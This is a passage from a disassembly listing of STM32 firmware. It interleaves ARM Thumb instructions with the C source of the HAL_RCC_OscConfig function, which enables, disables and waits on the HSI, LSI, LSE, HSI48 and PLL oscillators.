 8003c2e:	d101      	bne.n	8003c34 <HAL_RCC_OscConfig+0x328>
      {
        return HAL_ERROR;
 8003c30:	2301      	movs	r3, #1
 8003c32:	e277      	b.n	8004124 <HAL_RCC_OscConfig+0x818>
      }
      /* Otherwise, just the calibration is allowed */
      else
      {
        /* Adjusts the Internal High Speed oscillator (HSI) calibration value.*/
        __HAL_RCC_HSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->HSICalibrationValue);
 8003c34:	4b76      	ldr	r3, [pc, #472]	; (8003e10 <HAL_RCC_OscConfig+0x504>)
 8003c36:	685b      	ldr	r3, [r3, #4]
 8003c38:	f023 52f8 	bic.w	r2, r3, #520093696	; 0x1f000000
 8003c3c:	687b      	ldr	r3, [r7, #4]
 8003c3e:	691b      	ldr	r3, [r3, #16]
 8003c40:	061b      	lsls	r3, r3, #24
 8003c42:	4973      	ldr	r1, [pc, #460]	; (8003e10 <HAL_RCC_OscConfig+0x504>)
 8003c44:	4313      	orrs	r3, r2
 8003c46:	604b      	str	r3, [r1, #4]
      if((READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U) && (RCC_OscInitStruct->HSIState == RCC_HSI_OFF))
 8003c48:	e040      	b.n	8003ccc <HAL_RCC_OscConfig+0x3c0>
      }
    }
    else
    {
      /* Check the HSI State */
      if(RCC_OscInitStruct->HSIState != RCC_HSI_OFF)
 8003c4a:	687b      	ldr	r3, [r7, #4]
 8003c4c:	68db      	ldr	r3, [r3, #12]
 8003c4e:	2b00      	cmp	r3, #0
 8003c50:	d023      	beq.n	8003c9a <HAL_RCC_OscConfig+0x38e>
      {
        /* Enable the Internal High Speed oscillator (HSI). */
        __HAL_RCC_HSI_ENABLE();
 8003c52:	4b6f      	ldr	r3, [pc, #444]	; (8003e10 <HAL_RCC_OscConfig+0x504>)
 8003c54:	681b      	ldr	r3, [r3, #0]
 8003c56:	4a6e      	ldr	r2, [pc, #440]	; (8003e10 <HAL_RCC_OscConfig+0x504>)
 8003c58:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 8003c5c:	6013      	str	r3, [r2, #0]

        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003c5e:	f7fd fad1 	bl	8001204 <HAL_GetTick>
 8003c62:	6138      	str	r0, [r7, #16]

        /* Wait till HSI is ready */
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) == 0U)
 8003c64:	e008      	b.n	8003c78 <HAL_RCC_OscConfig+0x36c>
        {
          if((HAL_GetTick() - tickstart) > HSI_TIMEOUT_VALUE)
 8003c66:	f7fd facd 	bl	8001204 <HAL_GetTick>
 8003c6a:	4602      	mov	r2, r0
 8003c6c:	693b      	ldr	r3, [r7, #16]
 8003c6e:	1ad3      	subs	r3, r2, r3
 8003c70:	2b02      	cmp	r3, #2
 8003c72:	d901      	bls.n	8003c78 <HAL_RCC_OscConfig+0x36c>
          {
            return HAL_TIMEOUT;
 8003c74:	2303      	movs	r3, #3
 8003c76:	e255      	b.n	8004124 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) == 0U)
 8003c78:	4b65      	ldr	r3, [pc, #404]	; (8003e10 <HAL_RCC_OscConfig+0x504>)
 8003c7a:	681b      	ldr	r3, [r3, #0]
 8003c7c:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003c80:	2b00      	cmp	r3, #0
 8003c82:	d0f0      	beq.n	8003c66 <HAL_RCC_OscConfig+0x35a>
          }
        }

        /* Adjusts the Internal High Speed oscillator (HSI) calibration value.*/
        __HAL_RCC_HSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->HSICalibrationValue);
 8003c84:	4b62      	ldr	r3, [pc, #392]	; (8003e10 <HAL_RCC_OscConfig+0x504>)
 8003c86:	685b      	ldr	r3, [r3, #4]
 8003c88:	f023 52f8 	bic.w	r2, r3, #520093696	; 0x1f000000
 8003c8c:	687b      	ldr	r3, [r7, #4]
 8003c8e:	691b      	ldr	r3, [r3, #16]
 8003c90:	061b      	lsls	r3, r3, #24
 8003c92:	495f      	ldr	r1, [pc, #380]	; (8003e10 <HAL_RCC_OscConfig+0x504>)
 8003c94:	4313      	orrs	r3, r2
 8003c96:	604b      	str	r3, [r1, #4]
 8003c98:	e018      	b.n	8003ccc <HAL_RCC_OscConfig+0x3c0>
      }
      else
      {
        /* Disable the Internal High Speed oscillator (HSI). */
        __HAL_RCC_HSI_DISABLE();
 8003c9a:	4b5d      	ldr	r3, [pc, #372]	; (8003e10 <HAL_RCC_OscConfig+0x504>)
 8003c9c:	681b      	ldr	r3, [r3, #0]
 8003c9e:	4a5c      	ldr	r2, [pc, #368]	; (8003e10 <HAL_RCC_OscConfig+0x504>)
 8003ca0:	f423 7380 	bic.w	r3, r3, #256	; 0x100
 8003ca4:	6013      	str	r3, [r2, #0]

        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003ca6:	f7fd faad 	bl	8001204 <HAL_GetTick>
 8003caa:	6138      	str	r0, [r7, #16]

        /* Wait till HSI is disabled */
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U)
 8003cac:	e008      	b.n	8003cc0 <HAL_RCC_OscConfig+0x3b4>
        {
          if((HAL_GetTick() - tickstart) > HSI_TIMEOUT_VALUE)
 8003cae:	f7fd faa9 	bl	8001204 <HAL_GetTick>
 8003cb2:	4602      	mov	r2, r0
 8003cb4:	693b      	ldr	r3, [r7, #16]
 8003cb6:	1ad3      	subs	r3, r2, r3
 8003cb8:	2b02      	cmp	r3, #2
 8003cba:	d901      	bls.n	8003cc0 <HAL_RCC_OscConfig+0x3b4>
          {
            return HAL_TIMEOUT;
 8003cbc:	2303      	movs	r3, #3
 8003cbe:	e231      	b.n	8004124 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U)
 8003cc0:	4b53      	ldr	r3, [pc, #332]	; (8003e10 <HAL_RCC_OscConfig+0x504>)
 8003cc2:	681b      	ldr	r3, [r3, #0]
 8003cc4:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003cc8:	2b00      	cmp	r3, #0
 8003cca:	d1f0      	bne.n	8003cae <HAL_RCC_OscConfig+0x3a2>
        }
      }
    }
  }
  /*------------------------------ LSI Configuration -------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_LSI) == RCC_OSCILLATORTYPE_LSI)
 8003ccc:	687b      	ldr	r3, [r7, #4]
 8003cce:	681b      	ldr	r3, [r3, #0]
 8003cd0:	f003 0308 	and.w	r3, r3, #8
 8003cd4:	2b00      	cmp	r3, #0
 8003cd6:	d03c      	beq.n	8003d52 <HAL_RCC_OscConfig+0x446>
  {
    /* Check the parameters */
    assert_param(IS_RCC_LSI(RCC_OscInitStruct->LSIState));

    /* Check the LSI State */
    if(RCC_OscInitStruct->LSIState != RCC_LSI_OFF)
 8003cd8:	687b      	ldr	r3, [r7, #4]
 8003cda:	695b      	ldr	r3, [r3, #20]
 8003cdc:	2b00      	cmp	r3, #0
 8003cde:	d01c      	beq.n	8003d1a <HAL_RCC_OscConfig+0x40e>
        MODIFY_REG(RCC->CSR, RCC_CSR_LSIPREDIV, RCC_OscInitStruct->LSIDiv);
      }
#endif /* RCC_CSR_LSIPREDIV */

      /* Enable the Internal Low Speed oscillator (LSI). */
      __HAL_RCC_LSI_ENABLE();
 8003ce0:	4b4b      	ldr	r3, [pc, #300]	; (8003e10 <HAL_RCC_OscConfig+0x504>)
 8003ce2:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003ce6:	4a4a      	ldr	r2, [pc, #296]	; (8003e10 <HAL_RCC_OscConfig+0x504>)
 8003ce8:	f043 0301 	orr.w	r3, r3, #1
 8003cec:	f8c2 3094 	str.w	r3, [r2, #148]	; 0x94

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003cf0:	f7fd fa88 	bl	8001204 <HAL_GetTick>
 8003cf4:	6138      	str	r0, [r7, #16]

      /* Wait till LSI is ready */
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) == 0U)
 8003cf6:	e008      	b.n	8003d0a <HAL_RCC_OscConfig+0x3fe>
      {
        if((HAL_GetTick() - tickstart) > LSI_TIMEOUT_VALUE)
 8003cf8:	f7fd fa84 	bl	8001204 <HAL_GetTick>
 8003cfc:	4602      	mov	r2, r0
 8003cfe:	693b      	ldr	r3, [r7, #16]
 8003d00:	1ad3      	subs	r3, r2, r3
 8003d02:	2b02      	cmp	r3, #2
 8003d04:	d901      	bls.n	8003d0a <HAL_RCC_OscConfig+0x3fe>
        {
          return HAL_TIMEOUT;
 8003d06:	2303      	movs	r3, #3
 8003d08:	e20c      	b.n	8004124 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) == 0U)
 8003d0a:	4b41      	ldr	r3, [pc, #260]	; (8003e10 <HAL_RCC_OscConfig+0x504>)
 8003d0c:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003d10:	f003 0302 	and.w	r3, r3, #2
 8003d14:	2b00      	cmp	r3, #0
 8003d16:	d0ef      	beq.n	8003cf8 <HAL_RCC_OscConfig+0x3ec>
 8003d18:	e01b      	b.n	8003d52 <HAL_RCC_OscConfig+0x446>
      }
    }
    else
    {
      /* Disable the Internal Low Speed oscillator (LSI). */
      __HAL_RCC_LSI_DISABLE();
 8003d1a:	4b3d      	ldr	r3, [pc, #244]	; (8003e10 <HAL_RCC_OscConfig+0x504>)
 8003d1c:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003d20:	4a3b      	ldr	r2, [pc, #236]	; (8003e10 <HAL_RCC_OscConfig+0x504>)
 8003d22:	f023 0301 	bic.w	r3, r3, #1
 8003d26:	f8c2 3094 	str.w	r3, [r2, #148]	; 0x94

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003d2a:	f7fd fa6b 	bl	8001204 <HAL_GetTick>
 8003d2e:	6138      	str	r0, [r7, #16]

      /* Wait till LSI is disabled */
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) != 0U)
 8003d30:	e008      	b.n	8003d44 <HAL_RCC_OscConfig+0x438>
      {
        if((HAL_GetTick() - tickstart) > LSI_TIMEOUT_VALUE)
 8003d32:	f7fd fa67 	bl	8001204 <HAL_GetTick>
 8003d36:	4602      	mov	r2, r0
 8003d38:	693b      	ldr	r3, [r7, #16]
 8003d3a:	1ad3      	subs	r3, r2, r3
 8003d3c:	2b02      	cmp	r3, #2
 8003d3e:	d901      	bls.n	8003d44 <HAL_RCC_OscConfig+0x438>
        {
          return HAL_TIMEOUT;
 8003d40:	2303      	movs	r3, #3
 8003d42:	e1ef      	b.n	8004124 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) != 0U)
 8003d44:	4b32      	ldr	r3, [pc, #200]	; (8003e10 <HAL_RCC_OscConfig+0x504>)
 8003d46:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003d4a:	f003 0302 	and.w	r3, r3, #2
 8003d4e:	2b00      	cmp	r3, #0
 8003d50:	d1ef      	bne.n	8003d32 <HAL_RCC_OscConfig+0x426>
        }
      }
    }
  }
  /*------------------------------ LSE Configuration -------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_LSE) == RCC_OSCILLATORTYPE_LSE)
 8003d52:	687b      	ldr	r3, [r7, #4]
 8003d54:	681b      	ldr	r3, [r3, #0]
 8003d56:	f003 0304 	and.w	r3, r3, #4
 8003d5a:	2b00      	cmp	r3, #0
 8003d5c:	f000 80a6 	beq.w	8003eac <HAL_RCC_OscConfig+0x5a0>
  {
    FlagStatus       pwrclkchanged = RESET;
 8003d60:	2300      	movs	r3, #0
 8003d62:	77fb      	strb	r3, [r7, #31]
    /* Check the parameters */
    assert_param(IS_RCC_LSE(RCC_OscInitStruct->LSEState));

    /* Update LSE configuration in Backup Domain control register    */
    /* Requires to enable write access to Backup Domain of necessary */
    if(HAL_IS_BIT_CLR(RCC->APB1ENR1, RCC_APB1ENR1_PWREN))
 8003d64:	4b2a      	ldr	r3, [pc, #168]	; (8003e10 <HAL_RCC_OscConfig+0x504>)
 8003d66:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003d68:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8003d6c:	2b00      	cmp	r3, #0
 8003d6e:	d10d      	bne.n	8003d8c <HAL_RCC_OscConfig+0x480>
    {
      __HAL_RCC_PWR_CLK_ENABLE();
 8003d70:	4b27      	ldr	r3, [pc, #156]	; (8003e10 <HAL_RCC_OscConfig+0x504>)
 8003d72:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003d74:	4a26      	ldr	r2, [pc, #152]	; (8003e10 <HAL_RCC_OscConfig+0x504>)
 8003d76:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 8003d7a:	6593      	str	r3, [r2, #88]	; 0x58
 8003d7c:	4b24      	ldr	r3, [pc, #144]	; (8003e10 <HAL_RCC_OscConfig+0x504>)
 8003d7e:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003d80:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8003d84:	60bb      	str	r3, [r7, #8]
 8003d86:	68bb      	ldr	r3, [r7, #8]
      pwrclkchanged = SET;
 8003d88:	2301      	movs	r3, #1
 8003d8a:	77fb      	strb	r3, [r7, #31]
    }

    if(HAL_IS_BIT_CLR(PWR->CR1, PWR_CR1_DBP))
 8003d8c:	4b21      	ldr	r3, [pc, #132]	; (8003e14 <HAL_RCC_OscConfig+0x508>)
 8003d8e:	681b      	ldr	r3, [r3, #0]
 8003d90:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8003d94:	2b00      	cmp	r3, #0
 8003d96:	d118      	bne.n	8003dca <HAL_RCC_OscConfig+0x4be>
    {
      /* Enable write access to Backup domain */
      SET_BIT(PWR->CR1, PWR_CR1_DBP);
 8003d98:	4b1e      	ldr	r3, [pc, #120]	; (8003e14 <HAL_RCC_OscConfig+0x508>)
 8003d9a:	681b      	ldr	r3, [r3, #0]
 8003d9c:	4a1d      	ldr	r2, [pc, #116]	; (8003e14 <HAL_RCC_OscConfig+0x508>)
 8003d9e:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 8003da2:	6013      	str	r3, [r2, #0]

      /* Wait for Backup domain Write protection disable */
      tickstart = HAL_GetTick();
 8003da4:	f7fd fa2e 	bl	8001204 <HAL_GetTick>
 8003da8:	6138      	str	r0, [r7, #16]

      while(HAL_IS_BIT_CLR(PWR->CR1, PWR_CR1_DBP))
 8003daa:	e008      	b.n	8003dbe <HAL_RCC_OscConfig+0x4b2>
      {
        if((HAL_GetTick() - tickstart) > RCC_DBP_TIMEOUT_VALUE)
 8003dac:	f7fd fa2a 	bl	8001204 <HAL_GetTick>
 8003db0:	4602      	mov	r2, r0
 8003db2:	693b      	ldr	r3, [r7, #16]
 8003db4:	1ad3      	subs	r3, r2, r3
 8003db6:	2b02      	cmp	r3, #2
 8003db8:	d901      	bls.n	8003dbe <HAL_RCC_OscConfig+0x4b2>
        {
          return HAL_TIMEOUT;
 8003dba:	2303      	movs	r3, #3
 8003dbc:	e1b2      	b.n	8004124 <HAL_RCC_OscConfig+0x818>
      while(HAL_IS_BIT_CLR(PWR->CR1, PWR_CR1_DBP))
 8003dbe:	4b15      	ldr	r3, [pc, #84]	; (8003e14 <HAL_RCC_OscConfig+0x508>)
 8003dc0:	681b      	ldr	r3, [r3, #0]
 8003dc2:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8003dc6:	2b00      	cmp	r3, #0
 8003dc8:	d0f0      	beq.n	8003dac <HAL_RCC_OscConfig+0x4a0>
    {
      CLEAR_BIT(RCC->BDCR, RCC_BDCR_LSEON);
      CLEAR_BIT(RCC->BDCR, RCC_BDCR_LSEBYP);
    }
#else
    __HAL_RCC_LSE_CONFIG(RCC_OscInitStruct->LSEState);
 8003dca:	687b      	ldr	r3, [r7, #4]
 8003dcc:	689b      	ldr	r3, [r3, #8]
 8003dce:	2b01      	cmp	r3, #1
 8003dd0:	d108      	bne.n	8003de4 <HAL_RCC_OscConfig+0x4d8>
 8003dd2:	4b0f      	ldr	r3, [pc, #60]	; (8003e10 <HAL_RCC_OscConfig+0x504>)
 8003dd4:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003dd8:	4a0d      	ldr	r2, [pc, #52]	; (8003e10 <HAL_RCC_OscConfig+0x504>)
 8003dda:	f043 0301 	orr.w	r3, r3, #1
 8003dde:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003de2:	e029      	b.n	8003e38 <HAL_RCC_OscConfig+0x52c>
 8003de4:	687b      	ldr	r3, [r7, #4]
 8003de6:	689b      	ldr	r3, [r3, #8]
 8003de8:	2b05      	cmp	r3, #5
 8003dea:	d115      	bne.n	8003e18 <HAL_RCC_OscConfig+0x50c>
 8003dec:	4b08      	ldr	r3, [pc, #32]	; (8003e10 <HAL_RCC_OscConfig+0x504>)
 8003dee:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003df2:	4a07      	ldr	r2, [pc, #28]	; (8003e10 <HAL_RCC_OscConfig+0x504>)
 8003df4:	f043 0304 	orr.w	r3, r3, #4
 8003df8:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003dfc:	4b04      	ldr	r3, [pc, #16]	; (8003e10 <HAL_RCC_OscConfig+0x504>)
 8003dfe:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003e02:	4a03      	ldr	r2, [pc, #12]	; (8003e10 <HAL_RCC_OscConfig+0x504>)
 8003e04:	f043 0301 	orr.w	r3, r3, #1
 8003e08:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003e0c:	e014      	b.n	8003e38 <HAL_RCC_OscConfig+0x52c>
 8003e0e:	bf00      	nop
 8003e10:	40021000 	.word	0x40021000
 8003e14:	40007000 	.word	0x40007000
 8003e18:	4b9a      	ldr	r3, [pc, #616]	; (8004084 <HAL_RCC_OscConfig+0x778>)
 8003e1a:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003e1e:	4a99      	ldr	r2, [pc, #612]	; (8004084 <HAL_RCC_OscConfig+0x778>)
 8003e20:	f023 0301 	bic.w	r3, r3, #1
 8003e24:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003e28:	4b96      	ldr	r3, [pc, #600]	; (8004084 <HAL_RCC_OscConfig+0x778>)
 8003e2a:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003e2e:	4a95      	ldr	r2, [pc, #596]	; (8004084 <HAL_RCC_OscConfig+0x778>)
 8003e30:	f023 0304 	bic.w	r3, r3, #4
 8003e34:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
#endif /* RCC_BDCR_LSESYSDIS */

    /* Check the LSE State */
    if(RCC_OscInitStruct->LSEState != RCC_LSE_OFF)
 8003e38:	687b      	ldr	r3, [r7, #4]
 8003e3a:	689b      	ldr	r3, [r3, #8]
 8003e3c:	2b00      	cmp	r3, #0
 8003e3e:	d016      	beq.n	8003e6e <HAL_RCC_OscConfig+0x562>
    {
      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003e40:	f7fd f9e0 	bl	8001204 <HAL_GetTick>
 8003e44:	6138      	str	r0, [r7, #16]

      /* Wait till LSE is ready */
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 8003e46:	e00a      	b.n	8003e5e <HAL_RCC_OscConfig+0x552>
      {
        if((HAL_GetTick() - tickstart) > RCC_LSE_TIMEOUT_VALUE)
 8003e48:	f7fd f9dc 	bl	8001204 <HAL_GetTick>
 8003e4c:	4602      	mov	r2, r0
 8003e4e:	693b      	ldr	r3, [r7, #16]
 8003e50:	1ad3      	subs	r3, r2, r3
 8003e52:	f241 3288 	movw	r2, #5000	; 0x1388
 8003e56:	4293      	cmp	r3, r2
 8003e58:	d901      	bls.n	8003e5e <HAL_RCC_OscConfig+0x552>
        {
          return HAL_TIMEOUT;
 8003e5a:	2303      	movs	r3, #3
 8003e5c:	e162      	b.n	8004124 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 8003e5e:	4b89      	ldr	r3, [pc, #548]	; (8004084 <HAL_RCC_OscConfig+0x778>)
 8003e60:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003e64:	f003 0302 	and.w	r3, r3, #2
 8003e68:	2b00      	cmp	r3, #0
 8003e6a:	d0ed      	beq.n	8003e48 <HAL_RCC_OscConfig+0x53c>
 8003e6c:	e015      	b.n	8003e9a <HAL_RCC_OscConfig+0x58e>
      }
    }
    else
    {
      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003e6e:	f7fd f9c9 	bl	8001204 <HAL_GetTick>
 8003e72:	6138      	str	r0, [r7, #16]

      /* Wait till LSE is disabled */
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) != 0U)
 8003e74:	e00a      	b.n	8003e8c <HAL_RCC_OscConfig+0x580>
      {
        if((HAL_GetTick() - tickstart) > RCC_LSE_TIMEOUT_VALUE)
 8003e76:	f7fd f9c5 	bl	8001204 <HAL_GetTick>
 8003e7a:	4602      	mov	r2, r0
 8003e7c:	693b      	ldr	r3, [r7, #16]
 8003e7e:	1ad3      	subs	r3, r2, r3
 8003e80:	f241 3288 	movw	r2, #5000	; 0x1388
 8003e84:	4293      	cmp	r3, r2
 8003e86:	d901      	bls.n	8003e8c <HAL_RCC_OscConfig+0x580>
        {
          return HAL_TIMEOUT;
 8003e88:	2303      	movs	r3, #3
 8003e8a:	e14b      	b.n	8004124 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) != 0U)
 8003e8c:	4b7d      	ldr	r3, [pc, #500]	; (8004084 <HAL_RCC_OscConfig+0x778>)
 8003e8e:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003e92:	f003 0302 	and.w	r3, r3, #2
 8003e96:	2b00      	cmp	r3, #0
 8003e98:	d1ed      	bne.n	8003e76 <HAL_RCC_OscConfig+0x56a>
      CLEAR_BIT(RCC->BDCR, RCC_BDCR_LSESYSDIS);
#endif /* RCC_BDCR_LSESYSDIS */
    }

    /* Restore clock configuration if changed */
    if(pwrclkchanged == SET)
 8003e9a:	7ffb      	ldrb	r3, [r7, #31]
 8003e9c:	2b01      	cmp	r3, #1
 8003e9e:	d105      	bne.n	8003eac <HAL_RCC_OscConfig+0x5a0>
    {
      __HAL_RCC_PWR_CLK_DISABLE();
 8003ea0:	4b78      	ldr	r3, [pc, #480]	; (8004084 <HAL_RCC_OscConfig+0x778>)
 8003ea2:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003ea4:	4a77      	ldr	r2, [pc, #476]	; (8004084 <HAL_RCC_OscConfig+0x778>)
 8003ea6:	f023 5380 	bic.w	r3, r3, #268435456	; 0x10000000
 8003eaa:	6593      	str	r3, [r2, #88]	; 0x58
    }
  }
#if defined(RCC_HSI48_SUPPORT)
  /*------------------------------ HSI48 Configuration -----------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSI48) == RCC_OSCILLATORTYPE_HSI48)
 8003eac:	687b      	ldr	r3, [r7, #4]
 8003eae:	681b      	ldr	r3, [r3, #0]
 8003eb0:	f003 0320 	and.w	r3, r3, #32
 8003eb4:	2b00      	cmp	r3, #0
 8003eb6:	d03c      	beq.n	8003f32 <HAL_RCC_OscConfig+0x626>
  {
    /* Check the parameters */
    assert_param(IS_RCC_HSI48(RCC_OscInitStruct->HSI48State));

    /* Check the LSI State */
    if(RCC_OscInitStruct->HSI48State != RCC_HSI48_OFF)
 8003eb8:	687b      	ldr	r3, [r7, #4]
 8003eba:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8003ebc:	2b00      	cmp	r3, #0
 8003ebe:	d01c      	beq.n	8003efa <HAL_RCC_OscConfig+0x5ee>
    {
      /* Enable the Internal Low Speed oscillator (HSI48). */
      __HAL_RCC_HSI48_ENABLE();
 8003ec0:	4b70      	ldr	r3, [pc, #448]	; (8004084 <HAL_RCC_OscConfig+0x778>)
 8003ec2:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8003ec6:	4a6f      	ldr	r2, [pc, #444]	; (8004084 <HAL_RCC_OscConfig+0x778>)
 8003ec8:	f043 0301 	orr.w	r3, r3, #1
 8003ecc:	f8c2 3098 	str.w	r3, [r2, #152]	; 0x98

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003ed0:	f7fd f998 	bl	8001204 <HAL_GetTick>
 8003ed4:	6138      	str	r0, [r7, #16]

      /* Wait till HSI48 is ready */
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) == 0U)
 8003ed6:	e008      	b.n	8003eea <HAL_RCC_OscConfig+0x5de>
      {
        if((HAL_GetTick() - tickstart) > HSI48_TIMEOUT_VALUE)
 8003ed8:	f7fd f994 	bl	8001204 <HAL_GetTick>
 8003edc:	4602      	mov	r2, r0
 8003ede:	693b      	ldr	r3, [r7, #16]
 8003ee0:	1ad3      	subs	r3, r2, r3
 8003ee2:	2b02      	cmp	r3, #2
 8003ee4:	d901      	bls.n	8003eea <HAL_RCC_OscConfig+0x5de>
        {
          return HAL_TIMEOUT;
 8003ee6:	2303      	movs	r3, #3
 8003ee8:	e11c      	b.n	8004124 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) == 0U)
 8003eea:	4b66      	ldr	r3, [pc, #408]	; (8004084 <HAL_RCC_OscConfig+0x778>)
 8003eec:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8003ef0:	f003 0302 	and.w	r3, r3, #2
 8003ef4:	2b00      	cmp	r3, #0
 8003ef6:	d0ef      	beq.n	8003ed8 <HAL_RCC_OscConfig+0x5cc>
 8003ef8:	e01b      	b.n	8003f32 <HAL_RCC_OscConfig+0x626>
      }
    }
    else
    {
      /* Disable the Internal Low Speed oscillator (HSI48). */
      __HAL_RCC_HSI48_DISABLE();
 8003efa:	4b62      	ldr	r3, [pc, #392]	; (8004084 <HAL_RCC_OscConfig+0x778>)
 8003efc:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8003f00:	4a60      	ldr	r2, [pc, #384]	; (8004084 <HAL_RCC_OscConfig+0x778>)
 8003f02:	f023 0301 	bic.w	r3, r3, #1
 8003f06:	f8c2 3098 	str.w	r3, [r2, #152]	; 0x98

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003f0a:	f7fd f97b 	bl	8001204 <HAL_GetTick>
 8003f0e:	6138      	str	r0, [r7, #16]

      /* Wait till HSI48 is disabled */
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) != 0U)
 8003f10:	e008      	b.n	8003f24 <HAL_RCC_OscConfig+0x618>
      {
        if((HAL_GetTick() - tickstart) > HSI48_TIMEOUT_VALUE)
 8003f12:	f7fd f977 	bl	8001204 <HAL_GetTick>
 8003f16:	4602      	mov	r2, r0
 8003f18:	693b      	ldr	r3, [r7, #16]
 8003f1a:	1ad3      	subs	r3, r2, r3
 8003f1c:	2b02      	cmp	r3, #2
 8003f1e:	d901      	bls.n	8003f24 <HAL_RCC_OscConfig+0x618>
        {
          return HAL_TIMEOUT;
 8003f20:	2303      	movs	r3, #3
 8003f22:	e0ff      	b.n	8004124 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) != 0U)
 8003f24:	4b57      	ldr	r3, [pc, #348]	; (8004084 <HAL_RCC_OscConfig+0x778>)
 8003f26:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8003f2a:	f003 0302 	and.w	r3, r3, #2
 8003f2e:	2b00      	cmp	r3, #0
 8003f30:	d1ef      	bne.n	8003f12 <HAL_RCC_OscConfig+0x606>
#endif /* RCC_HSI48_SUPPORT */
  /*-------------------------------- PLL Configuration -----------------------*/
  /* Check the parameters */
  assert_param(IS_RCC_PLL(RCC_OscInitStruct->PLL.PLLState));

  if(RCC_OscInitStruct->PLL.PLLState != RCC_PLL_NONE)
 8003f32:	687b      	ldr	r3, [r7, #4]
 8003f34:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8003f36:	2b00      	cmp	r3, #0
 8003f38:	f000 80f3 	beq.w	8004122 <HAL_RCC_OscConfig+0x816>
  {
    /* PLL On ? */
    if(RCC_OscInitStruct->PLL.PLLState == RCC_PLL_ON)
 8003f3c:	687b      	ldr	r3, [r7, #4]
 8003f3e:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8003f40:	2b02      	cmp	r3, #2
 8003f42:	f040 80c9 	bne.w	80040d8 <HAL_RCC_OscConfig+0x7cc>
#endif /* RCC_PLLP_SUPPORT */
      assert_param(IS_RCC_PLLQ_VALUE(RCC_OscInitStruct->PLL.PLLQ));
      assert_param(IS_RCC_PLLR_VALUE(RCC_OscInitStruct->PLL.PLLR));

      /* Do nothing if PLL configuration is the unchanged */
      pll_config = RCC->PLLCFGR;
 8003f46:	4b4f      	ldr	r3, [pc, #316]	; (8004084 <HAL_RCC_OscConfig+0x778>)
 8003f48:	68db      	ldr	r3, [r3, #12]
 8003f4a:	617b      	str	r3, [r7, #20]
      if((READ_BIT(pll_config, RCC_PLLCFGR_PLLSRC)  != RCC_OscInitStruct->PLL.PLLSource) ||
